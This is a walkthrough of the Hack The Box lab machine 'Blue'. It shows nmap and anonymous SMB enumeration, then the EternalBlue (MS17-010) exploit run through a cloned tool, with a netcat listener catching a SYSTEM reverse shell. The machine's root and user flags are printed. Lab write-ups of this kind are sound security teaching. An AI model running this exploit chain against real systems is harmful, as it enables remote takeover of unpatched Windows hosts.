This is my write-up/walkthrough for [the Hack The Box machine, Blue](https://app.hackthebox.com/machines/Blue). It's a Windows machine, rated "Easy", with 10.10.10.40 as its IP address.

![Alt text](/images/blue/2022-03-03-hack-the-box-blue-01.JPG "Blue Info Card")

I started with an nmap scan—

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ sudo nmap -sC -sV -A 10.10.10.40
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-03 05:53 EST
Nmap scan report for 10.10.10.40
Host is up (0.24s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=3/3%OT=135%CT=1%CU=35446%PV=Y%DS=2%DC=T%G=Y%TM=62209F4
OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=106%TI=I%CI=I%TS=7)SEQ(SP=1
OS:08%GCD=1%ISR=107%TI=I%CI=I%II=I%SS=S%TS=7)OPS(O1=M54BNW8ST11%O2=M54BNW8S
OS:T11%O3=M54BNW8NNT11%O4=M54BNW8ST11%O5=M54BNW8ST11%O6=M54BST11)WIN(W1=200
OS:0%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M54
OS:BNW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%
OS:W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=
OS:)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=
OS:S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF
OS:=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=
OS:G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-03-03T10:57:59
|_  start_date: 2022-03-03T10:52:41
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-03-03T10:58:03+00:00
|_clock-skew: mean: 3s, deviation: 2s, median: 1s

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   351.29 ms 10.10.16.1
2   155.83 ms 10.10.10.40

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 271.03 seconds

```

—that told me I have a couple of RPC ports, port 139 (NetBIOS), and port 445 (SMB) to work with. I figured I'll start by listing the active shares on the machine:

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ smbclient -L 10.10.10.40                                                                                                                                                                                130 ⨯
Enter WORKGROUP\thatvirdiguy's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Share           Disk      
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.40 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

Trying to exploit a potential misconfiguration on SMB was getting me nowhere—

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ smbclient -L 10.10.10.40 -U Administrator
Enter WORKGROUP\Administrator's password: 
session setup failed: NT_STATUS_LOGON_FAILURE

┌──(thatvirdiguy㉿kali)-[~]
└─$ smbclient -N \\\\10.10.10.40\\ADMIN$                                                                                                                                                                      1 ⨯
tree connect failed: NT_STATUS_ACCESS_DENIED
                                                                                                                                                                                                                  
┌──(thatvirdiguy㉿kali)-[~]
└─$ smbclient -N \\\\10.10.10.40\\C$                                                                                                                                                                          1 ⨯
tree connect failed: NT_STATUS_ACCESS_DENIED
```

—until I did get in, but there was nothing of note there.

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ smbclient -N \\\\10.10.10.40\\Share                                                                                                                                                                       1 ⨯
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Jul 14 09:48:44 2017
  ..                                  D        0  Fri Jul 14 09:48:44 2017

                4692735 blocks of size 4096. 592873 blocks available
smb: \> ^C
```

Finally, I hit a share that looked promising.

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ smbclient -N \\\\10.10.10.40\\Users                                                                                                                                                                       1 ⨯
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Fri Jul 21 02:56:23 2017
  ..                                 DR        0  Fri Jul 21 02:56:23 2017
  Default                           DHR        0  Tue Jul 14 03:07:31 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:54:24 2009
  Public                             DR        0  Tue Apr 12 03:51:29 2011

                4692735 blocks of size 4096. 592862 blocks available
smb: \> cd Default\
smb: \Default\> dir
  .                                 DHR        0  Tue Jul 14 03:07:31 2009
  ..                                DHR        0  Tue Jul 14 03:07:31 2009
  AppData                           DHn        0  Mon Jul 13 23:20:08 2009
  Desktop                            DR        0  Mon Jul 13 22:34:59 2009
  Documents                          DR        0  Tue Jul 14 01:08:56 2009
  Downloads                          DR        0  Mon Jul 13 22:34:59 2009
  Favorites                          DR        0  Mon Jul 13 22:34:59 2009
  Links                              DR        0  Mon Jul 13 22:34:59 2009
  Music                              DR        0  Mon Jul 13 22:34:59 2009
  NTUSER.DAT                       AHSn   262144  Fri Jul 14 18:37:57 2017
  NTUSER.DAT.LOG                     AH     1024  Tue Apr 12 03:54:55 2011
  NTUSER.DAT.LOG1                    AH   189440  Sun Jul 16 16:22:24 2017
  NTUSER.DAT.LOG2                    AH        0  Mon Jul 13 22:34:08 2009
  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf    AHS    65536  Tue Jul 14 00:45:54 2009
  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Tue Jul 14 00:45:54 2009
  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Tue Jul 14 00:45:54 2009
  Pictures                           DR        0  Mon Jul 13 22:34:59 2009
  Saved Games                        Dn        0  Mon Jul 13 22:34:59 2009
  Videos                             DR        0  Mon Jul 13 22:34:59 2009

                4692735 blocks of size 4096. 593014 blocks available
smb: \Default\> get NTUSER.DAT
getting file \Default\NTUSER.DAT of size 262144 as NTUSER.DAT (158.9 KiloBytes/sec) (average 158.9 KiloBytes/sec)
smb: \Default\> get NTUSER.DAT.LOG
getting file \Default\NTUSER.DAT.LOG of size 1024 as NTUSER.DAT.LOG (1.4 KiloBytes/sec) (average 110.7 KiloBytes/sec)
smb: \Default\> get NTUSER.DAT.LOG1
getting file \Default\NTUSER.DAT.LOG1 of size 189440 as NTUSER.DAT.LOG1 (145.8 KiloBytes/sec) (average 123.1 KiloBytes/sec)
smb: \Default\>
smb: \Default\> cd ../
smb: \> cd Public
smb: \Public\> dir
  .                                  DR        0  Tue Apr 12 03:51:29 2011
  ..                                 DR        0  Tue Apr 12 03:51:29 2011
  desktop.ini                       AHS      174  Tue Jul 14 00:54:24 2009
  Documents                          DR        0  Tue Jul 14 01:08:56 2009
  Downloads                          DR        0  Tue Jul 14 00:54:24 2009
  Favorites                         DHR        0  Mon Jul 13 22:34:59 2009
  Libraries                         DHR        0  Tue Jul 14 00:54:24 2009
  Music                              DR        0  Tue Jul 14 00:54:24 2009
  Pictures                           DR        0  Tue Jul 14 00:54:24 2009
  Recorded TV                        DR        0  Tue Apr 12 03:51:29 2011
  Videos                             DR        0  Tue Jul 14 00:54:24 2009

                4692735 blocks of size 4096. 592862 blocks available
smb: \Public\> get desktop.ini

getting file \Public\desktop.ini of size 174 as desktop.ini (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \Public\>
smb: \Public\> ^C
```

I then spent some time reading more about what this "`desktop.ini`" and "`NTUSER.DAT`" are, and if there is potential exploit out there in the wild for me to use, but that wasn't the right approach. I figured out the right approach when I did a `searchsploit` on "windows smb" but limited the results to Windows 7 since, as per the nmap scan, that's the operating system this box is running.

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ searchsploit windows smb | grep "7"
Microsoft - SMB Server Trans2 Zero Size Pool Alloc (MS10-054)                                                                                                                   | windows/dos/14607.py
Microsoft DNS RPC Service - 'extractQuotedChar()' Remote Overflow 'SMB' (MS07-029) (Metasploit)                                                                                 | windows/remote/16366.rb
Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'EternalChampion' SMB Remote Code Execution (Metasploit) (MS17-010)                                                       | windows/remote/43970.rb
Microsoft Windows - 'SMBGhost' Remote Code Execution                                                                                                                            | windows/remote/48537.py
Microsoft Windows - 'srv2.sys' SMB Negotiate ProcessID Function Table Dereference (MS09-050)                                                                                    | windows/remote/14674.txt
Microsoft Windows - LSASS SMB NTLM Exchange Null-Pointer Dereference (MS16-137)                                                                                                 | windows/dos/40744.txt
Microsoft Windows - SMB Remote Code Execution Scanner (MS17-010) (Metasploit)                                                                                                   | windows/dos/41891.rb
Microsoft Windows - SMB2 Negotiate Protocol '0x72' Response Denial of Service                                                                                                   | windows/dos/12524.py
Microsoft Windows - SmbRelay3 NTLM Replay (MS08-068)                                                                                                                            | windows/remote/7125.txt
Microsoft Windows 10 (1903/1909) - 'SMBGhost' SMB3.1.1 'SMB2_COMPRESSION_CAPABILITIES' Local Privilege Escalation                                                               | windows/local/48267.txt
Microsoft Windows 10.0.17134.648 - HTTP -> SMB NTLM Reflection Leads to Privilege Elevation                                                                                     | windows/local/47115.txt
Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                                                                                                | windows/remote/42031.py
Microsoft Windows 7/2008 R2 - SMB Client Trans2 Stack Overflow (MS10-020) (PoC)                                                                                                 | windows/dos/12273.py
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                                                                            | windows/remote/42315.py
Microsoft Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB Remote Code Execution (MS17-010)                                                                                      | windows_x86-64/remote/42030.py
Microsoft Windows 95/Windows for Workgroups - 'smbclient' Directory Traversal                                                                                                   | windows/remote/20371.txt
Microsoft Windows NT 4.0 SP5 / Terminal Server 4.0 - 'Pass the Hash' with Modified SMB Client                                                                                   | windows/remote/19197.txt
Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' SMB Remote Code Execution (MS17-010)                                                                                   | windows_x86-64/remote/41987.py
Microsoft Windows SMB Server (v1/v2) - Mount Point Arbitrary Device Open Privilege Escalation                                                                                   | windows/dos/43517.txt
Microsoft Windows Vista/7 - SMB2.0 Negotiate Protocol Request Remote Blue Screen of Death (MS07-063)                                                                            | windows/dos/9594.txt
Microsoft Windows XP/2000/NT 4.0 - Network Share Provider SMB Request Buffer Overflow (1)                                                                                       | windows/dos/21746.c
Microsoft Windows XP/2000/NT 4.0 - Network Share Provider SMB Request Buffer Overflow (2)                                                                                       | windows/dos/21747.txt
VideoLAN VLC Client (Windows x86) - 'smb://' URI Buffer Overflow (Metasploit)                                                                                                   | windows_x86/local/16678.rb
VideoLAN VLC Media Player 1.0.0/1.0.1 - 'smb://' URI Handling Buffer Overflow (PoC)

```

That "EternalBlue" looked promising, not just because it allowed remote code execution via SMB, but because it tied to the name of the box – perhaps the biggest hint yet. Reading more on it led me to [CVE-2017-0144](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0144), [this](https://research.checkpoint.com/2017/eternalblue-everything-know/) excellent explainer, and [d4t4s3c's Win7Blue](https://github.com/d4t4s3c/Win7Blue) tool to exploit this vulnerability.

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ git clone https://github.com/d4t4s3c/Win7Blue.git
Cloning into 'Win7Blue'...
remote: Enumerating objects: 331, done.
remote: Counting objects: 100% (331/331), done.
remote: Compressing objects: 100% (325/325), done.
remote: Total 331 (delta 180), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (331/331), 1.78 MiB | 4.10 MiB/s, done.
Resolving deltas: 100% (180/180), done.
                                                                                                                                                                                                                  
┌──(thatvirdiguy㉿kali)-[~]
└─$ cd Win7Blue 
                                                                                                                                                                                                                  
┌──(thatvirdiguy㉿kali)-[~/Win7Blue]
└─$ ls
eternalblue_scanner.py  LICENSE  ms17_010_eternalblue.py  mysmb.py  README.md  screenshots  sc_x64_kernel.bin  sc_x86_kernel.bin  Win7Blue.sh

┌──(thatvirdiguy㉿kali)-[~/Win7Blue]
└─$ chmod +x Win7Blue.sh
```

Once the tool was set up, all I had to do was point it to the right IP address and port number—

```
┌═══════════════════════════════════┐
║  ██╗    ██╗██╗███╗   ██╗███████╗  ║
║  ██║    ██║██║████╗  ██║╚════██║  ║
║  ██║ █╗ ██║██║██╔██╗ ██║    ██╔╝  ║
║  ██║███╗██║██║██║╚██╗██║   ██╔╝   ║
║  ╚███╔███╔╝██║██║ ╚████║   ██║    ║
║   ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝   ╚═╝    ║
║ ██████╗ ██╗     ██╗   ██╗███████╗ ║
║ ██╔══██╗██║     ██║   ██║██╔════╝ ║
║ ██████╔╝██║     ██║   ██║█████╗   ║
║ ██╔══██╗██║     ██║   ██║██╔══╝   ║
║ ██████╔╝███████╗╚██████╔╝███████╗ ║
║ ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝ ║
║ [+]  EternalBlue -- MS17-010  [+] ║
└═══════════════════════════════════┘

[1] Scan
[2] Exploit Windows 7 x86
[3] Exploit Windows 7 x64
[4] Exit

 $ 3

¿RHOST?

10.10.10.40

¿LHOST?

10.10.16.2

¿LPORT?

1234

Creating SHELLCODE with MSFVENOM

shellcode size: 1232
numGroomConn: 13
Target OS: Windows 7 Professional 7601 Service Pack 1
SMB1 session setup allocate nonpaged pool success
SMB1 session setup allocate nonpaged pool success
good response status: INVALID_PARAMETER
done
```

—with an `nc` listening for open connections on port 1234 on my machine.

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ nc -lvp 1234
listening on [any] 1234 ...

10.10.10.40: inverse host lookup failed: Unknown host
connect to [10.10.16.2] from (UNKNOWN) [10.10.10.40] 49158
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cd ../../
cd ../../

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE92-053B

 Directory of C:\

14/07/2009  03:20    <DIR>          PerfLogs
18/02/2022  15:02    <DIR>          Program Files
14/07/2017  16:58    <DIR>          Program Files (x86)
14/07/2017  13:48    <DIR>          Share
21/07/2017  06:56    <DIR>          Users
03/03/2022  13:45    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)   2,420,174,848 bytes free

C:\>cd Users
cd Users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE92-053B

 Directory of C:\Users

21/07/2017  06:56    <DIR>          .
21/07/2017  06:56    <DIR>          ..
21/07/2017  06:56    <DIR>          Administrator
14/07/2017  13:45    <DIR>          haris
12/04/2011  07:51    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)   2,420,174,848 bytes free

C:\Users>cd Administrator
cd Administrator

C:\Users\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE92-053B

 Directory of C:\Users\Administrator

21/07/2017  06:56    <DIR>          .
21/07/2017  06:56    <DIR>          ..
21/07/2017  06:56    <DIR>          Contacts
24/12/2017  02:22    <DIR>          Desktop
21/07/2017  06:56    <DIR>          Documents
18/02/2022  15:21    <DIR>          Downloads
21/07/2017  06:56    <DIR>          Favorites
21/07/2017  06:56    <DIR>          Links
21/07/2017  06:56    <DIR>          Music
21/07/2017  06:56    <DIR>          Pictures
21/07/2017  06:56    <DIR>          Saved Games
21/07/2017  06:56    <DIR>          Searches
21/07/2017  06:56    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)   2,420,174,848 bytes free

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE92-053B

 Directory of C:\Users\Administrator\Desktop

24/12/2017  02:22    <DIR>          .
24/12/2017  02:22    <DIR>          ..
03/03/2022  12:20                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   2,420,174,848 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
418ead732b35f1f8aa340b89b8c44545

C:\Users\Administrator\Desktop>cd ../../
cd ../../

C:\Users>dir    
dir
 Volume in drive C has no label.
 Volume Serial Number is BE92-053B

 Directory of C:\Users

21/07/2017  06:56    <DIR>          .
21/07/2017  06:56    <DIR>          ..
21/07/2017  06:56    <DIR>          Administrator
14/07/2017  13:45    <DIR>          haris
12/04/2011  07:51    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)   2,420,174,848 bytes free

C:\Users>cd haris
cd haris

C:\Users\haris>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE92-053B

 Directory of C:\Users\haris

14/07/2017  13:45    <DIR>          .
14/07/2017  13:45    <DIR>          ..
15/07/2017  07:58    <DIR>          Contacts
24/12/2017  02:23    <DIR>          Desktop
15/07/2017  07:58    <DIR>          Documents
15/07/2017  07:58    <DIR>          Downloads
15/07/2017  07:58    <DIR>          Favorites
15/07/2017  07:58    <DIR>          Links
15/07/2017  07:58    <DIR>          Music
15/07/2017  07:58    <DIR>          Pictures
15/07/2017  07:58    <DIR>          Saved Games
15/07/2017  07:58    <DIR>          Searches
15/07/2017  07:58    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)   2,420,174,848 bytes free

C:\Users\haris>cd Desktop
cd Desktop

C:\Users\haris\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE92-053B

 Directory of C:\Users\haris\Desktop

24/12/2017  02:23    <DIR>          .
24/12/2017  02:23    <DIR>          ..
03/03/2022  12:20                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   2,420,174,848 bytes free

C:\Users\haris\Desktop>type user.txt   
type user.txt
488fd74534dbe1a1822b54d6404ed961
```
